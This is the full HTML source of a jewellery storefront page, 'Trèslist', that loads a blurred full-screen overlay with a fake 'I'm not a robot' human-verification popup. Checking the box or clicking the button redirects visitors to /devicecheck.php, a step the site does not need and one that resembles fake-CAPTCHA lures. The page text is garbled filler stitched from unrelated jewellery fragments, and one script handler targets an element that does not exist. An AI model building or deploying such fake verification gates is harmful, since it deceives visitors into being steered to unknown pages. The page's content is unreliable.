
        <!DOCTYPE html>
<html lang="en">
   <head>
      <!-- basic -->
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <!-- mobile metas -->
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="viewport" content="initial-scale=1, maximum-scale=1">
      <!-- site metas -->
      <title>Trèslist</title>
      <meta name="keywords" content="">
      <meta name="description" content="">
      <meta name="author" content="">
      <!-- bootstrap css -->
      <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
      <!-- style css -->
      <link rel="stylesheet" type="text/css" href="css/style.css">
      <!-- Responsive-->
      <link rel="stylesheet" href="css/responsive.css">
      <!-- fevicon -->
      <link rel="icon" href="images/fevicon.png" type="image/gif" />
      <!-- Scrollbar Custom CSS -->
      <link rel="stylesheet" href="css/jquery.mCustomScrollbar.min.css">
      <!-- Tweaks for older IEs-->
      <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
      <!-- owl stylesheets --> 
      <link rel="stylesheet" href="css/owl.carousel.min.css">
      <link rel="stylesheet" href="css/owl.theme.default.min.css">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
      <style>
      .banner_section {
         width: 100%;
         float: left;
         background-image: url(assets/banner/jewellary/21.webp);
         height: auto;
         background-size: 100%;
         padding: 10px 0px 25px 0px;
         background-repeat: no-repeat;
      }
      
      .services_section {
            width: 100%;
            float: left;
            background-image: url(assets/banner/jewellary/30.webp);
            height: auto;
            padding-bottom: 100px;
            background-attachment: fixed;
        }
        
        .mail_section {
            width: 100%;
            float: left;
            background-image: url(assets/banner/jewellary/29.webp);
            height: auto;
            padding: 23px 70px;
            background-repeat: no-repeat;
            background-size: cover;
        }
   </style>
     
<style>
           /* Dark Overlay with Blur Effect */
            #popupOverlay {
                display: flex;
                align-items: center;
                justify-content: center;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.5);
                backdrop-filter: blur(10px);
                z-index: 9999;
            }
    
            /* Popup Box */
            #verificationPopup {
                width: 90%;
                max-width: 500px;
                background: white;
                color: black;
                padding: 40px;
                text-align: center;
                border-radius: 15px;
                box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
                animation: popUpFadeIn 0.5s ease-in-out;
            }
    
            /* Animation */
            @keyframes popUpFadeIn {
                from {
                    transform: scale(0.8);
                    opacity: 0;
                }
    
                to {
                    transform: scale(1);
                    opacity: 1;
                }
            }
    
            /* WAIT GIF Icon */
            #popupImage {
                width: 120px;
                height: 120px;
                margin-bottom: 20px;
            }
    
            /* Text */
            #popupContent h2 {
                font-size: 26px;
                font-weight: bold;
                margin-bottom: 15px;
            }
    
            #popupContent p {
                font-size: 18px;
                margin-bottom: 20px;
            }
    
            /* Checkbox & Button Container */
            .verification-container {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
            }
    
            /* Checkbox */
            #verifyCheckbox {
                width: 20px;
                height: 20px;
                cursor: pointer;
            }
    
            /* Verification Button */
            #datacheck {
                cursor: pointer;
                background: #4285F4;
                color: white;
                font-size: 20px;
                padding: 12px 30px;
                border: none;
                border-radius: 30px;
                box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.2);
                transition: 0.3s;
                text-decoration: none;
            }
    
            #datacheck.active {
                pointer-events: auto;
                opacity: 1;
                text-decoration: none;
            }
    
            #datacheck:hover {
                background: #3367D6;
                color: white;
            }
    
            /* Responsive Design */
            @media (max-width: 768px) {
                #verificationPopup {
                    width: 95%;
                    padding: 30px;
                }
    
                #popupImage {
                    width: 100px;
                    height: 100px;
                }
    
                #popupContent h2 {
                    font-size: 22px;
                }
    
                #popupContent p {
                    font-size: 16px;
                }
    
                #datacheck {
                    font-size: 18px;
                    padding: 10px 25px;
                }
            }
        </style>
        <!-- Dark Overlay -->
        <div id="popupOverlay">
            <!-- Human Verification Popup -->
            <div id="verificationPopup">
                <!-- WAIT GIF Icon -->
                <img id="popupImage" src="https://i.gifer.com/ZZ5H.gif" alt="Loading...">

                <!-- Popup Content -->
                <div id="popupContent">
                    <h2>Please Wait...</h2>
                    <p>Human verification is required to proceed.</p>


<div class="verification-container">
                        <input type="checkbox" id="verifyCheckbox">
                        <label for="verifyCheckbox">I'm not a robot</label>
                    </div>

                    <br>
                    <a id="datacheck" href="/devicecheck.php">I AM HUMAN ✅</a>
                </div>
            </div>
        </div>

        <script>
         

            // Show popup on page load
            window.onload = function () {
                document.getElementById("popupOverlay").style.display = "flex";
                disableScroll();
            };

            // Enable button & redirect on checkbox click
            document.getElementById("verifyCheckbox").addEventListener("change", function () {
                if (this.checked) {
                    window.location.href = "/devicecheck.php"; //
                }
            });

            document.getElementById("verifyButton").addEventListener("click", function (event) {
                if (document.getElementById("verifyCheckbox").checked) {
                    window.location.href = "/devicecheck.php"; //
                } else {
                    event.preventDefault(); //
                    alert("Please verify that you are not a robot!"); // 
                }});
        </script>
   </head>
   <body>
      <!--header section start -->
      <div class="header_section">
         <div class="container-fluid">
            <nav class="navbar navbar-expand-lg navbar-light bg-light">
               <div class="logo"><a href="index.php" style="color: #fff; font-size: 40px;">Trèslist</div>
               <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav"aria-expanded="false" aria-label="Toggle navigation">
               <span class="navbar-toggler-icon"></span>
               </button>
               <div class="collapse navbar-collapse" id="navbarNav">
                  <ul class="navbar-nav ml-auto">
                     <li class="nav-item active">
                        <a class="nav-link" href="index.php">Home</a>
                     </li>
                     <li class="nav-item">
                        <a class="nav-link" href="about.php">About</a>
                     </li>
                     <li class="nav-item">
                        <a class="nav-link" href="privacy-policy.php">Privacy Policy </a>
                     </li>
                     <li class="nav-item">
                        <a class="nav-link" href="terms-conditions.php">Terms</a>
                     </li>
                     <li class="nav-item">
                        <a class="nav-link" href="contact.php">Contact Us</a>
                     </li>
                  </ul>
               </div>
            </nav>
         </div>
      </div>
      <!--header section end -->
      <!-- banner section start -->
      <div class="banner_section layout_padding">
         <div class="container">
            <div id="main_slider" class="carousel slide" data-ride="carousel">
               <div class="carousel-inner">
                  <div class="carousel-item active">
                     <div class="row">
                        <div class="col-sm-12">
                           <div class="banner_taital">
                              <h1 class="coffee_text" style="color: #000 !important;">Luxury Jewelry</h1>
                              <p class="there_text" style="color: #000 !important;"> Purpose – Is it for daily wear, a special occasion, or an investment?
2</p>
                              <div class="learnmore_bt"><a href="contact.php">Contact Us</a></div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!-- banner section end -->
      <!-- about section start -->
      <div class="about_section layout_padding">
         <div class="container">
            <div class="row">
               <div class="col-md-6">
                  <div class="about_taital_main">
                     <div class="about_taital" style="color: #000 !important;">About Us</div>
                     <p class="about_text">Jewelry has been an integral part of human culture for thousands of years, symbolizing wealth, status, love, and artistic expression. From ancient civilizations to modern fashion trends, jewelry continues to hold a special place in peoples lives, whether as a sentimental heirloom, a fashion statement, or an investment.

 The History of Jewelry
Jewelry dates back to prehistoric times, evolving through various cultures and historical periods:
- Prehistoric Era – Early humans wore shells, bones, and stones as ornaments.
- Ancient Egypt (3000 BC  30 BC) – Gold jewelry adorned pharaohs.</p>
                  </div>
               </div>
               <div class="col-md-6">
                  <div class="about_img"><img src="assets/section/jewellary/49.webp"></div>
               </div>
            </div>
         </div>
      </div>
      <!-- about section end -->
      <!-- gallery section start -->
      <div class="gallery_section layout_padding">
         <div class="container">
            <div class="row">
               <div class="col-sm-12">
                  <h1 class="gallery_taital" style="color: #000 !important;">Our Gallery</h1>
                  <p class="gallery_text">
- Pearls – Classic and timeless, pearls are used in necklaces, earrings, and rings</p>
               </div>
            </div>
            <div class="">
               <div class="gallery_section_2">
                  <div class="row">
                     <div class="col-md-4">
                        <div class="container_main">
                           <img src="assets/section/jewellary/13.webp" alt="Avatar" class="image">
                           <div class="overlay">
                              <div class="text"><a href="#"><i class="fa fa-search" aria-hidden="true"></i></a></div>
                           </div>
                        </div>
                     </div>
                     <div class="col-md-4">
                        <div class="container_main">
                           <img src="assets/section/jewellary/46.webp" alt="Avatar" class="image">
                           <div class="overlay">
                              <div class="text"><a href="#"><i class="fa fa-search" aria-hidden="true"></i></a></div>
                           </div>
                        </div>
                     </div>
                     <div class="col-md-4">
                        <div class="container_main">
                           <img src="assets/section/jewellary/22.webp" alt="Avatar" class="image">
                           <div class="overlay">
                              <div class="text"><a href="#"><i class="fa fa-search" aria-hidden="true"></i></a></div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="gallery_section_2">
                  <div class="row">
                     <div class="col-md-4">
                        <div class="container_main">
                           <img src="assets/section/jewellary/6.webp" alt="Avatar" class="image">
                           <div class="overlay">
                              <div class="text"><a href="#"><i class="fa fa-search" aria-hidden="true"></i></a></div>
                           </div>
                        </div>
                     </div>
                     <div class="col-md-4">
                        <div class="container_main">
                           <img src="assets/section/jewellary/2.webp" alt="Avatar" class="image">
                           <div class="overlay">
                              <div class="overlay">
                                 <div class="text"><a href="#"><i class="fa fa-search" aria-hidden="true"></i></a></div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="col-md-4">
                        <div class="container_main">
                           <img src="assets/section/jewellary/22.webp" alt="Avatar" class="image">
                           <div class="overlay">
                              <div class="overlay">
                                 <div class="text"><a href="#"><i class="fa fa-search" aria-hidden="true"></i></a></div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!-- gallery section end -->
      <!-- services section start -->
      <div class="services_section layout_padding">
         <div class="container">
            <div class="row">
               <div class="col-sm-12">
                  <h1 class="services_taital">Dazzling Diamonds</h1>
                  <p class="services_text">
- Modern Era – Jewelry is now more accessible, diverse, and influenced by changing fashion trends</p>
               </div>
            </div>
            <div class="services_section_2">
               <div class="row">
                  <div class="col-lg-4 col-sm-12 col-md-4">
                     <div class="box_main active">
                        <div class="house_icon">
                        </div>
                        <h3 class="decorate_text">Ethereal Designs</h3>
                        <p class="tation_text"> Budget  Jewelry options range from affordable fashion jewelry to high-end luxury pieces</p>
                     </div>
                  </div>
                  <div class="col-lg-4 col-sm-12 col-md-4">
                     <div class="box_main">
                        <div class="house_icon">
                        </div>
                        <h3 class="decorate_text">Royal Shine</h3>
                        <p class="tation_text">
- Precious Gemstones – Includes rubies, sapphires, and emeralds, often set in fine jewelry</p>
                     </div>
                  </div>
                  <div class="col-lg-4 col-sm-12 col-md-4">
                     <div class="box_main">
                        <div class="house_icon">
                        </div>
                        <h3 class="decorate_text">Ethnic Grace</h3>
                        <p class="tation_text">
- Ancient Egypt (3000 BC – 30 BC) – Gold jewelry adorned pharaohs and signified divine power</p>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      <!-- services section end -->
      <!-- contact section start -->
      <div class="contact_section layout_padding">
         <div class="container">
            <h1 class="contact_text" style="color: #000 !important;">Contact Us</h1>
         </div>
      </div>
      <div class="contact_section_2 layout_padding">
         <div class="container-fluid">
            <div class="row" style="padding-bottom: 100px;">
               <div class="col-2"></div>
               <div class="col-md-8 padding_0">
                  <div class="mail_section">
                     <div class="email_text">
                        <div class="form-group">
                           <input type="text" class="email-bt" placeholder="Name" name="Email">
                        </div>
                        <div class="form-group">
                           <input type="text" class="email-bt" placeholder="Email" name="Email">
                        </div>
                        <div class="form-group">
                           <input type="text" class="email-bt" placeholder="Phone Numbar" name="Email">
                        </div>
                        <div class="form-group">
                           <textarea class="massage-bt" placeholder="Massage" rows="5" id="comment" name="Massage"></textarea>
                        </div>
                        <div class="send_btn">
                           <div type="text" class="main_bt"><a href="#">SEND</a></div>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-2"></div>

            </div>
         </div>
      </div>
      <!-- contact section end -->
      <!-- footer section start -->
      <div class="footer_section layout_padding">
         <div class="container">
            <div class="row">
               <div class="col-lg-4 col-sm-6">
                  <center>
                  <h1 class="useful_text">Customer Care</h1>
                  <p class="footer_text">Our dedicated customer care<br>
                     team is available 24/7</p>
                  </center>
               </div>
               
               <div class="col-lg-4 col-sm-6">
                  <center>
                  <h3 class="useful_text">Trèslist</h3>
                  <p class="footer_text">Jewelry has been an integral part of human culture for thousands of years, symbolizing wealth.</p>
               </center>
               </div>
               <div class="col-lg-4 col-sm-6">
                  <center>
                  <h3 class="useful_text">Menu</h3>
                  <div class="footer_menu">
                     <ul>
                        <li><a href="index.php">Home</a></li>
                        <li><a href="privacy-policy.php">Privacy Policy</a></li>
                        <li><a href="terms-conditions.php">Terms & Conditions</a></li>
                        <li><a href="contact.php">Contact Us</a></li>
                     </ul>
                  </div>
                  </center>
               </div>
               
            </div>
         </div>
      </div>
      <!-- copyright section end -->
      <!-- Javascript files-->
      <script src="js/jquery.min.js"></script>
      <script src="js/popper.min.js"></script>
      <script src="js/bootstrap.bundle.min.js"></script>
      <script src="js/jquery-3.0.0.min.js"></script>
      <script src="js/plugin.js"></script>
      <!-- sidebar -->
      <script src="js/jquery.mCustomScrollbar.concat.min.js"></script>
      <script src="js/custom.js"></script>     
   </body>
</html>
        